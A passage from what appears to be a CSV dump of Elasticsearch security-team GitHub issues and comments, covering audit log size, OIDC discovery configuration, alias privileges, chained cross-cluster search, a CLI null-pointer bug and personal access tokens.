-2018.10.06"",""logstash-atl_metrics-2018.09.16"",""logstash-atl_metrics-2018.10.09"",""logstash-atl_metrics-2018.09.15"",""logstash-atl_metrics-2018.10.08"",""logstash-atl_metrics-2018.09.14"",""logstash-atl_metrics-2018.09.13"",""logstash-atl_metrics-2018.09.12"",""logstash-atl_metrics-2018.09.11"",""logstash-atl_metrics-2018.09.10"",""logstash-atl_metrics-2018.10.01"",""logstash-atl_metrics-2018.10.03"",""logstash-atl_metrics-2018.10.02"",""logstash-atl_metrics-2018.10.05"",""logstash-atl_metrics-2018.10.04"",""logstash-atl_metrics-2018.09.19"",""logstash-atl_metrics-2018.09.07"",""logstash-atl_metrics-2018.09.06"",""logstash-atl_metrics-2018.09.05"",""logstash-atl_metrics-2018.09.04"",""logstash-atl_metrics-2018.09.03"",""logstash-atl_metrics-2018.09.02"",""logstash-atl_metrics-2018.09.01"",""logstash-atl_metrics-2018.09.09"",""logstash-atl_metrics-2018.09.08"",""logstash-atl_metrics-2018.10.29"",""logstash-atl_metrics-2018.10.28"",""logstash-atl_metrics-2019.09.08"",""logstash-atl_metrics-2019.09.07"",""logstash-atl_metrics-2019.09.09"",""logstash-atl_metrics-2018.10.21"",""logstash-atl_metrics-2018.10.20"",""logstash-atl_metrics-2018.09.30"",""logstash-atl_metrics-2018.10.23"",""logstash-atl_metrics-2018.10.22"",""logstash-atl_metrics-2018.10.25"",""logstash-atl_metrics-2018.10.24"",""logstash-atl_metrics-2018.10.27"",""logstash-atl_metrics-2018.10.26"",""logstash-atl_metrics-2019.09.04"",""logstash-atl_metrics-2019.09.03"",""logstash-atl_metrics-2019.09.06"",""logstash-atl_metrics-2019.09.05"",""logstash-atl_metrics-2019.09.02"",""logstash-atl_metrics-2019.09.01"",""logstash-atl_metrics-2018.09.29"",""logstash-atl_metrics-2018.10.18"",""logstash-atl_metrics-2018.09.28"",""logstash-atl_metrics-2018.10.17"",""logstash-atl_metrics-2018.09.27"",""logstash-atl_metrics-2018.09.26"",""logstash-atl_metrics-2018.10.19"",""logstash-atl_metrics-2019.10.09"",""logstash-atl_metrics-2018.09.25"",""logstash-atl_metrics-2019.09.19"",""logstash-atl_metrics-2019.10.08"",""logstash-atl_metrics-2018.09.24"",""logstash-atl_metrics-2019.09.18"",""logstash-atl_metrics-2019.10.07"",""logstash-atl_metrics-2018.09.23"",""logstash-atl_metrics-2019.10.06"",""logstash-atl_metrics-2018.09.22"",""logstash-atl_metrics-2019.10.05"",""logstash-atl_metrics-2018.09.21"",""logstash-atl_metrics-2018.10.10"",""logstash-atl_metrics-2019.10.04"",""logstash-atl_metrics-2018.09.20"",""logstash-atl_metrics-2019.10.03"",""logstash-atl_metrics-2018.10.12"",""logstash-atl_metrics-2019.10.02"",""logstash-atl_metrics-2018.10.11"",""logstash-atl_metrics-2019.10.01"",""logstash-atl_metrics-2018.10.14"",""logstash-atl_metrics-2018.10.13"",""logstash-atl_metrics-2018.10.16"",""logstash-atl_metrics-2018.10.15"",""logstash-atl_metrics-2019.09.15"",""logstash-atl_metrics-2019.09.14"",""logstash-atl_metrics-2019.09.17"",""logstash-atl_metrics-2019.09.16"",""logstash-atl_metrics-2019.09.11"",""logstash-atl_metrics-2019.09.10"",""logstash-atl_metrics-2019.09.13"",""logstash-atl_metrics-2019.09.12"",""logstash-atl_metrics-2019.10.19"",""logstash-atl_metrics-2019.09.29"",""logstash-atl_metrics-2019.10.18"",""logstash-atl_metrics-2019.10.17"",""logstash-atl_metrics-2019.10.16"",""logstash-atl_metrics-2019.10.15"",""logstash-atl_metrics-2019.10.14"",""logstash-atl_metrics-2019.10.13"",""logstash-atl_metrics-2019.10.12"",""logstash-atl_metrics-2019.10.11"",""logstash-atl_metrics-2019.10.10"",""logstash-atl_metrics-2019.09.20"",""logstash-atl_metrics-2019.09.26"",""logstash-atl_metrics-2019.09.25"",""logstash-atl_metrics-2019.09.28"",""logstash-atl_metrics-2019.09.27"",""logstash-atl_metrics-2019.09.22"",""logstash-atl_metrics-2019.09.21"",""logstash-atl_metrics-2019.09.24"",""logstash-atl_metrics-2019.09.23"",""logstash-atl_metrics-2019.10.29"",""logstash-atl_metrics-2019.10.28"",""logstash-atl_metrics-2019.10.27"",""logstash-atl_metrics-2019.10.26"",""logstash-atl_metrics-2018.10.31"",""logstash-atl_metrics-2019.10.25"",""logstash-atl_metrics-2019.10.24"",""logstash-atl_metrics-2019.10.23"",""logstash-atl_metrics-2019.10.22"",""logstash-atl_metrics-2019.10.21"",""logstash-atl_metrics-2019.10.20"",""logstash-atl_metrics-2019.09.30"",""logstash-atl_metrics-2018.10.30"",""logstash-atl_metrics-2018.12.08"",""logstash-atl_metrics-2018.12.09"",""logstash-atl_metrics-2018.12.02"",""logstash-atl_metrics-2018.12.03"",""logstash-atl_metrics-2018.12.01"",""logstash-atl_metrics-2018.12.06"",""logstash-atl_metrics-2018.12.07"",""logstash-atl_metrics-2018.12.04"",""logstash-atl_metrics-2019.10.31"",""logstash-atl_metrics-2018.12.05"",""logstash-atl_metrics-2019.10.30"",""logstash-atl_metrics_v6-2017.08.17"",""logstash-atl_metrics_v6-2017.08.18"",""logstash-atl_metrics_v6-2017.08.19""]}
```

Providing a `xpack.security.audit.logfile.emit_index_names` setting can be helpful, or a setting to set a threshold of the max number of index names to emit, etc.. so that users will not have to modify the default template for the audit logging file from within log4j2.properties, e.g., remove the `                %varsNotEmpty{, ""indices"":%map{indices}}\` line.
","Pinging @elastic/es-security (:Security/Audit)@ppf2 We are aware that in certain cases the audit events repeat themselves, possibly replicating long lists of index names.
But, I worry about the lack of usefulness of audit logs if they only list ""some"" of the indices. I would advocate for all or nothing, since ""some"" do not really provide any benefit; and then audit logs without index names do not provide much value either...

I don't really see a way out... What's the specific concern they have, disk space? Human readability?Thanks @albertzaharovits Some users were seeing upwards of 27G+ of audit logs per day because it prints out 800+ index name on every request.  For them, they are not always interested in the full list of indices (800+ at a time) - mostly interested in higher level user access and action type, unless they have to do query tuning or finer auditing.  So it can be helpful to provide an option for users to enable/disable index name reporting in audit logging dynamically as needed.  27G+ log file makes the log file utterly useless to use locally on server and sending over to remote ES cluster.
Please support disabling printing of index names.@ppf2 @allenmchan Thank you for the input. We acknowledged this is a problem.
We discussed to implement a toggle option to allow logging the requested alias/wildcard instead of the resolved concrete-index list. However, looking at the code, this is not trivially to implement.

Another option, which I will investigated, and which ties in with https://github.com/elastic/elasticsearch/issues/47408 , is to show the complete concrete-index list on the coordinating node, and only show the concrete-index for the actual searched shard on the data node.",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,549087697,"certutil http command kibana PKCS #12","Now that Kibana supports [PKCS #12](https://github.com/elastic/kibana/issues/17039), the certutil's http command can be modified to output PKCS <span>#</span>12 certs for Kibana. Continuing to use PEM is fine as well, but it PKCS <span>#</span>12 would keep Kibana consistent with Elasticsearch.","Pinging @elastic/es-security (:Security/Network)Hello @kobelb , 
We are a team of new contributors to your project.
we saw here : [https://www.elastic.co/guide/en/elasticsearch/reference/current/certutil.html] 
that certutil already generate pkcs#12 certs, so we want to know more exactly what is the issue and what should we do ? ",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,559697597,"Add Cache-Control or Expires header to has_privileges request when using API Key","**Describe the feature**: 
The `has_privileges` API allows to determine whether or not a user or an API Key has certain privileges. The request can be authorized by setting the `Authorization: ApiKey xyz` header.  
API Keys can be created with an expiration date, but the expiration date is not returned within the `has_privileges` request. For client side caching it would be helpful if a `Cache-Control` or an `Expires` header would be returned, indicating when the API Key expires.

cc @tvernum ","Pinging @elastic/es-security (:Security/Security)",no,":Security/Security,Team:Security,"
elastic/elasticsearch,822013922,"Formalise the concept of ""singleton"" realm type","There are realm types for which only a single realm can be configured for them. They are informally referred as the ""singleton"" relam type. For example, the `file`, `native` and `kerberos` realm type all fall into this category (the `reserved` realm also behave this way but it is not configurable so it is less of a concern). Currently, this ""singleton"" concept is not formalised. Whenever they are needed, ad-hoc checks are performed for it (see [Realms#initRealms](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/Realms.java#L167) for an example).

It would be useful to formalise this concept into the `Realm` itself, i.e. something that can be actively declared by a `Realm` subclass. It has at least the following benefits:
1. The intention is clear by just look at the each `Realm` subclass as opposed to having to read through the call sites
2. The logic is explicit and can be enforced in one place
3. Custom realms can also declare to be ""singleton"" and have it checked and enforced the same way as builtin realms.

PS: the word `singleton` is a working term and can possilby change in the actual implementation.","Pinging @elastic/es-security (Team:Security)@ywangd if I get your proposal correctly, this change will not impact on the configuration file that will continue to use the realm name. Is that correct?@bytebilly Correct. It really is just a refactoring with no user facing changes (unless if you are a developer for custom realms).",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1339716832,"Spelling error on line 74 of SslFileUtil.java","### Elasticsearch Version

master branch

### Installed Plugins

_No response_

### Java Version

no

### OS Version

no

### Problem Description

There are a spelling error on line 74 of SslFileUtil.java in the module ssl-config. The sentence ""one of more"" may be replaced by the sentence ""one or more"".

### Steps to Reproduce

no

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,448058077,"Allow OpenID Connect Realm to be configured from OP configuration","As defined in https://openid.net/specs/openid-connect-discovery-1_0.html

> OpenID Providers supporting Discovery MUST make a JSON document available at the path formed by concatenating the string /.well-known/openid-configuration to the Issuer.

This JSON document would contain all configuration parameters needed by the OpenID Connect realm and as such, we should allow users to configure the realm by only setting the `op.issuer` instead of / as an alternative to setting all of the 
```
op.issuer:
op.authorization_endpoint:
op.token_endpoint:
op.userinfo_endpoint:
op.endsession_endpoint:
op.jwks_path: 
```","Pinging @elastic/es-securityIn the meantime, here's a shell command which might help query the `.well-known/openid-configuration` and generate the appropriate configuration for Elasticsearch. I haven't tested this in production, though, so some changes might be required.

```
curl -s https://accounts.google.com/.well-known/openid-configuration  | jq '{ ""op.issuer"": .issuer, ""op.authorization_endpoint"": .authorization_endpoint, ""op.token_endpoint"": .token_endpoint, ""op.userinfo_endpoint"": .userinfo_endpoint, ""op.endsession_endpoint"": .end_session_endpoint, ""op.jwkset_path"": (.jwks_uri | sub(""^https?://[^/]+/""; """")) }' 
```

Testing on Google and Okta:

```
# Google OIDC
% curl -s https://accounts.google.com/.well-known/openid-configuration  | jq '{ ""op.issuer"": .issuer, ""op.authorization_endpoint"": .authorization_endpoint, ""op.token_endpoint"": .token_endpoint, ""op.userinfo_endpoint"": .userinfo_endpoint, ""op.endsession_endpoint"": .end_session_endpoint, ""op.jwkset_path"": (.jwks_uri | sub(""^https?://[^/]+/""; """")) }' 
{
  ""op.issuer"": ""https://accounts.google.com"",
  ""op.authorization_endpoint"": ""https://accounts.google.com/o/oauth2/v2/auth"",
  ""op.token_endpoint"": ""https://oauth2.googleapis.com/token"",
  ""op.userinfo_endpoint"": ""https://openidconnect.googleapis.com/v1/userinfo"",
  ""op.endsession_endpoint"": null,
  ""op.jwkset_path"": ""oauth2/v3/certs""
}

# example.okta.com
% curl -s https://example.okta.com/.well-known/openid-configuration  | jq '{ ""op.issuer"": .issuer, ""op.authorization_endpoint"": .authorization_endpoint, ""op.token_endpoint"": .token_endpoint, ""op.userinfo_endpoint"": .userinfo_endpoint, ""op.endsession_endpoint"": .end_session_endpoint, ""op.jwkset_path"": (.jwks_uri | sub(""^https?://[^/]+/""; """")) }' | less
{
  ""op.issuer"": ""https://example.okta.com"",
  ""op.authorization_endpoint"": ""https://example.okta.com/oauth2/v1/authorize"",
  ""op.token_endpoint"": ""https://example.okta.com/oauth2/v1/token"",
  ""op.userinfo_endpoint"": ""https://example.okta.com/oauth2/v1/userinfo"",
  ""op.endsession_endpoint"": ""https://example.okta.com/oauth2/v1/logout"",
  ""op.jwkset_path"": ""oauth2/v1/keys""
}
```Thanks @jordansissel. Your command assumes that the user has downloaded the jwkset as a file in their local environment and that they use the same path that the OP uses in their web dir to store it locally, which will probably not be the case. There is no need to parse the URL, Elasticsearch can support remote JWKSet files, so the correct version would be something like:

```
curl -s https://accounts.google.com/.well-known/openid-configuration  | jq '{ ""op.issuer"": .issuer, ""op.authorization_endpoint"": .authorization_endpoint, ""op.token_endpoint"": .token_endpoint, ""op.userinfo_endpoint"": .userinfo_endpoint, ""op.endsession_endpoint"": .end_session_endpoint, ""op.jwkset_path"": .jwks_uri }'
```

That gives the following for Google i.e. : 
```
{
  ""op.issuer"": ""https://accounts.google.com"",
  ""op.authorization_endpoint"": ""https://accounts.google.com/o/oauth2/v2/auth"",
  ""op.token_endpoint"": ""https://oauth2.googleapis.com/token"",
  ""op.userinfo_endpoint"": ""https://openidconnect.googleapis.com/v1/userinfo"",
  ""op.endsession_endpoint"": null,
  ""op.jwkset_path"": ""https://www.googleapis.com/oauth2/v3/certs""
}

```",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1377228338,"CLI elasticsearch-users should handle missing users_roles file ","Most sub-commands of the `elasticsearch-users` CLI needs to access `users_roles` file as well as `users` file. When `user_roles` does not exist, the parsing code returns `null`:

https://github.com/elastic/elasticsearch/blob/3603aa71516b4d0e35ef41510ff8995a2580136c/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/file/FileUserRolesStore.java#L112-L114

The `null` value is handled in some cases, e.g. `./bin/elasticsearch-users list`. But it is not handled for sub-commands `useradd`, `userdel` and `roles`, e.g.:

https://github.com/elastic/elasticsearch/blob/3603aa71516b4d0e35ef41510ff8995a2580136c/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/file/tool/UsersTool.java#L131

A NPE is thrown when `null` is not handled and the error message is not user friendly:
```
Exception in thread ""main"" java.lang.NullPointerException: Cannot invoke ""java.util.Map.size()"" because ""m"" is null
        at java.base/java.util.HashMap.putMapEntries(HashMap.java:495)
        at java.base/java.util.HashMap.<init>(HashMap.java:484)
        at org.elasticsearch.xpack.security.authc.file.tool.UsersTool$AddUserCommand.execute(UsersTool.java:131)
        at org.elasticsearch.common.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:54)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:85)
        at org.elasticsearch.cli.MultiCommand.execute(MultiCommand.java:94)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:85)
        at org.elasticsearch.cli.Command.main(Command.java:50)
        at org.elasticsearch.launcher.CliToolLauncher.main(CliToolLauncher.java:64)
```

We should handle the `null` value and report missing file error consistent with other places.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,1403815108,"[8.4] [Doc] Correctly cite setup-passwords CLI for minimal security guide (#90579)","Backports the following commits to 8.4:
 - [Doc] Correctly cite setup-passwords CLI for minimal security guide (#90579)","Failures are unrelated but reproducible. I raised https://github.com/elastic/elasticsearch/issues/90783@elasticmachine update branch",yes,">docs,:Security/Security,backport,Team:Docs,Team:Security,auto-merge,v8.4.4,"
elastic/elasticsearch,814323488,"Permission to only create indices with associated aliases  ","We can grant permissions to only create, but not delete, indices and data streams.
This is useful for ingest clients, which are ideally only permitted to ""append data"".

However, there's a problem with creating indices with associated aliases (data streams cannot currently be created with aliases). When we authorize the index creation, we also check that the user has the permission to ""manage aliases"" (ie run the `indices:admin/aliases` action).
Trouble is, the only action used to manage aliases also allows deleting indices.
Therefore, currently **we cannot grant permissions to create indices with associated aliases, unless we also permit deleting indices**.

I think we should create a new privilege to add and remove aliases, but not remove indices, and authorize ""create index"" requests with associated aliases if the user has the new privilege.

Relates https://github.com/elastic/elasticsearch/pull/69212
","Pinging @elastic/es-security (Team:Security)To expound a bit on the new privilege thing. We have this endpoint to [manage aliases](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/indices-aliases.html) that adds and removes aliases to indices, but it also permits removing indices. The request translates to a single internal action, the limit at which we authorize (it has to be a single action because we want the changes in a request to be atomic).

But I think we must authorize the actions that only deal with aliases differently.
As an example, suppose the new privilege is named `manage_alias`:
```
curl -X POST ""localhost:9200/_security/role/test_manage_alias?pretty"" -H 'Content-Type: application/json' -d'
{
  ""indices"": [
    {
      ""names"": [ ""test*"" ],
      ""privileges"": [""manage_alias""]
    }
  ]
}
'
```
which permits requests such as:
```
curl -X POST ""localhost:9200/_aliases?pretty"" -H 'Content-Type: application/json' -d'
{
  ""actions"" : [
    { ""add"" : { ""index"" : ""test1"", ""alias"" : ""test_alias1"" } },
    { ""remove"" : { ""index"" : ""test2*"", ""alias"" : ""test_alias2"" } }
  ]
}
'
```
but does not permit:
```
curl -X POST ""localhost:9200/_aliases?pretty"" -H 'Content-Type: application/json' -d'
{
  ""actions"" : [
    { ""remove_index"" : { ""index"" : ""test2"" } }
  ]
}
'
```
To also permit the `remove_index` action, we should require at least the `delete_index` privilege.

In the case of the create index with associated aliases request, because that request only adds aliases, we should only verify that the user has the `manage_alias` privilege (at least) on the alias as well as the index names.I suspect users get around this limitation by setting aliases in the index template.@ywangd raised the objection that the `manage_alias` makes a distinction between indices and aliases, which is something we usually shy away from.",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317447467,"[License] Log message for disabled security when using basic license","*Original comment by @jpcarey:*

If you have a basic license applied, we do not log any messages indicating security is disabled.  We should log a message indicating this once the module has successfully determined license information.

","*Original comment by @skearns64:*

Where would you expect this message to be printed? 

Today, as part of applying a Basic license over the built-in trial (or any other license type other than Basic), the user must pass ""?acknowledge=true"", which is how they acknowledge that security will be disabled. The error message that explains that is very clear about what features will be disabled when you apply the license, I think.*Original comment by @jpcarey:*

I would expect as the node is initializing, it would print out in the normal elasticsearch log. 

I am embarrassed to admit that I stumbled across this after troubleshooting with a customer for almost an hour.  The customer was on 2.3.3, and had applied the basic license in the dev environment (before installing shield from my understanding, if that matters?).  Troubleshooting was passed on from an SA once they became a customer, and I certainly should have double checked the license - but I never expected that we would not log one item about shield not being used (but still showing up in the plugin output, etc).  I had even enabled TRACE on shield.authc.

It is understandable that *someone* has to acknowledge this when uploading the license, but they may not always be the person trying to understand why some functionality is not working. A simple log line would have helped.*Original comment by @jaymode:*

> Today, as part of applying a Basic license over the built-in trial (or any other license type other than Basic), the user must pass ""?acknowledge=true"", which is how they acknowledge that security will be disabled. The error message that explains that is very clear about what features will be disabled when you apply the license, I think.

In this case the user installed the license **before** installing shield, which means they had nothing to acknowledge.

In my opinion, logging is not the answer but would help. I am beginning to think we should say in ""production mode"" features that are not licensed must be disabled (via settings) to eliminate this confusion. So if you install a basic license, you must disable security and watcher or you will not be able to start.*Original comment by @tvernum:*

I think it makes sense to have a `DEBUG`/`INFO` logging message when security is disabled, that states the reason why.

```
X-Pack Security is disabled because xpath.security.enabled is false
```

```
X-Pack Security is disabled because it is not permitted by your license
```

As Jay says, we should probably do something _better_ than that, but as a 100% backwards compatible change, it makes perfect sense to log diagnostics when an installed feature is turned off.
",no,":Security/Security,:Security/License,Team:Security,"
elastic/elasticsearch,1301409665,"Clarification for unsupported behaviour of chained CCS","The behaviour of chained CCS, e.g. `GET cluster1:cluster2:index/_search`, is undefined in Elasticsearch. It works in certain cases but fails _sliently_ in others. Currently we do not have intention to support it. The fact it works in certain cases is accidental and should not be relied upon. We should clarify it in the relevant docs.

Note that a cluster never directly talks to another cluster unless one is configured as remote cluster of the other. This means chained CCS does not violate any intended constraint of network connection rules.","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-search (Team:Search)Ping @justincr-elastic @gwbrown for awareness. This is not anything like a goal for the new CCx model. But the new model may have a better definition for this behaviour as a by-product.We haven't made an explicit statement, but my suspicion is that we'll completely disallow this kind of ""chained query"" under the new model in the initial release in order to simplify some of the privilege interaction, but at the same time the new security model would make this kind of chained deployment much easier to codify so I think it could be added without too much effort later - I think the biggest effort in initially supporting it might be building the infrastructure for three-cluster test cases (maybe that's easy now, I'm not up to date on testclusters).

Honestly the biggest question, I think, is: What are the use cases for this? It's neat that we can do this, but I'd want to know more about why people *want* to do this before building official support for it.I don't think it would be easy to support this in the new model. The new RBAC model would define the user's permissions on the originating cluster. Since the originating cluster knows nothing about the 3rd cluster, what permissions would we assign to the user?My initial take on this is that we should enforce that it's not supported currently in CCS.  If it works it's only by accident and we never tested it nor documented it . I would like to see a real usecase where it is needed before we invested effort in it.Is their proposed architecture to support less flat organizational structures?

It is not always feasible or desired to set up permissions so that every cluster in an organization can talk to every other cluster directly.  I see this requirement in the Department of Defense space where organizations are not flat, one-tier structures.  There is very much a need for a multi-tier cross-cluster search capability where sub-orgs under an organization's command and control are directly responsible for a subset of other sub-orgs in a nested, multi-tier structure.In one of the previous discussions, the user was trying to use this setup to cater network connection constaint, i.e. they wanted to use one cluster in the middle to proxy requests between the other two. But I am not sure whether this networking constraint is directly related to support less flat organisation structure.Agree 💯 with @Jaraxal - large, enterprise-class architectures will absolutely need this sort of multi-level cross cluster chaining, and integrated security across all will be crucial as well.I did some additional research and this is a valid use case in some org types like it was described above.

I'm not sure that we want to target the ""network restriction"" problem, as it should be addressed via other network solutions and this would sound like a hack. However, the ""multi-level orgs"" scenario sounds totally legit to me.

Said that, I think that we could invest some time to figure out how it would be possible (and properly done) with the new security model, even if it may be part of a future iteration. Otherwise, this could be a blocker for the possible future removal of the legacy model.> Otherwise, this could be a blocker for the possible future removal of the legacy model.

How could it be if it currently works only in some scenarios and only by accident? We don't have a single test for this and @ywangd pointed out that it does not consistently work.The issue is that today we have users relying on this approach, that apparently is working well for their use case even if it is not intended as an official feature. Feedback from the field is that this is an important feature.
If the new model will prevent that behavior, users that need it will just continue using the existing one if they are not able to find a suitable workaround.

That's why I think that we should investigate if we can support it in the new security model. In that case, we can provide an official way to do that, and properly test it. If we figure out that this is not possible, we will clearly state that removing the gray area.",no,">docs,:Search/Search,:Security/Authorization,Team:Docs,Team:Search,Team:Security,"
elastic/elasticsearch,1390680689,"[CI] TokenAuthIntegTests testExpiredTokensDeletedAfterExpiration failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/aw7y6j4cp6qwa/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.authc.TokenAuthIntegTests/testExpiredTokensDeletedAfterExpiration

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testExpiredTokensDeletedAfterExpiration"" -Dtests.seed=EC2CC2DA4EEC559E -Dtests.locale=zh-TW -Dtests.timezone=Indian/Cocos -Druntime.java=8`

**Applicable branches:**
7.17

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.TokenAuthIntegTests&tests.test=testExpiredTokensDeletedAfterExpiration

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: an empty collection
     but: <[ElasticsearchException[Error invalidating access_token: ]; nested: DocumentMissingException[[_doc][token_dtU7Vy4kLjbWeRer72HOSSoDv_mpBseh3wwJWU-4aXQ]: document missing];]>

  at __randomizedtesting.SeedInfo.seed([EC2CC2DA4EEC559E:ED0DD6C375AA1A8F]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testExpiredTokensDeletedAfterExpiration(TokenAuthIntegTests.java:229)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:498)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:748)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,489079094,"Signature verification issue when handling SAML LogoutRequest","It seems like we fail to parse the `Signature` query parameter correctly from the request and this causes us to fail signature verification. 

This was originally reported in the [forums](https://discuss.elastic.co/t/elasticsearch-saml2-0-and-adfs-signature-validation-issue-with-single-logout/190666)","Pinging @elastic/es-securityFrom a quick look at it, the fact that the Signature value we log is only 32 characters is a red herring as the truncating is only performed for logging purposes. We probably need an ADFS instance to get to the bottom of this",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454141,"API to return effective permissions for a given user ","*Original comment by @skearns64:*

I imagine this as an administrative API endpoint, and eventually a UI as well. Given a user, or the current user, return the current roles of that user and the effective permissions those roles grant. 


",,no,">feature,:Security/Security,Team:Security,"
elastic/elasticsearch,1046101637,"Personal Access Tokens","In a recent RFC regarding how Kibana handles Authentication headers provided by proxies, the following statement was made

> The Kibana and Elasticsearch security teams posit that an API Key is not a user, and that an API Key is not necessarily under the control of the user that created it. In other words, these are not designed to be used as ""personal access tokens"".

While API keys have not been designed to be used as ""personal access tokens"", we have seen them used in this manner. For example, when a user authenticates to Kibana using an SSO realm, we've commonly recommended that they create an API key if they want to use a tool like `curl` to communicate with either Elasticsearch or Kibana HTTP APIs.

This will likely only get more common over time in situations like Elastic Cloud (ESS) as we continue to support additional different types of users who can authenticate using the preconfigured Elastic Cloud SSO realm.

As we begin adding Kibana features that are ""per user"" and the API Keys that a user has created are seen as a different user, we will introduce some interesting behaviors for the situations where we have historically been using API keys like ""personal access tokens"" and will eventually need personal access tokens.

/cc @elastic/kibana-security ","Pinging @elastic/es-security (Team:Security)I feel that we are mixing multiple topics here, so I'll try to clarify a few details about our existing plans for API keys and PAT.

API keys can still be used to directly access Elasticsearch API in the case of SSO realms. However, API keys are not PAT and don't ""follow the user"". This means that their use may have unexpected behaviors in some cases. They also require a specific privilege to be created.

For Cloud SSO, we agreed that API keys are enough to guarantee access to Elasticsearch API at this stage, since SSO users are always superusers, their permissions don't change, and they can create API keys.
PAT have been discussed in this context several times, and we decided to further follow up in the future when Cloud SSO will possibly evolve to support multiple users with different roles, and use of native users will be drastically reduced.

